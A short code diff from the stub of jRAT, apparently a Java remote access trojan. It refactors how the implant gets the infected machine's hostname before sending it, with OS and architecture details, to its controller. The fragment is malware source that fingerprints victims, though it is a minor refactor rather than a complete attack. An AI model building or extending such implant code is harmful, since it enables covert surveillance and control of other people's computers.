@@ -17,6 +17,7 @@ import se.jrat.common.codec.Hex;
 import se.jrat.common.crypto.Crypto;
 import se.jrat.common.crypto.KeyExchanger;
 import se.jrat.common.io.StringWriter;
+import se.jrat.common.utils.UserUtils;
 import se.jrat.stub.packets.incoming.AbstractIncomingPacket;
 import se.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
 import se.jrat.stub.packets.outgoing.Packet10InitDefaultLocale;
@@ -136,12 +137,7 @@ public class Connection implements Runnable {
 
 		addToSendQueue(new Packet16InitOperatingSystem(OperatingSystem.getShortOperatingSystem(), OperatingSystem.getLongOperatingSystem(), Arch.getStringFromArch()));
 		
-		String computerName;
-		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
-			computerName = System.getenv("COMPUTERNAME");
-		} else {
-			computerName = System.getProperty("user.name");
-		}
+		String computerName = UserUtils.getHostname();
 		addToSendQueue(new Packet14InitComputerName(computerName));
 
 		addToSendQueue(new Packet15InitServerID(Main.getID()));
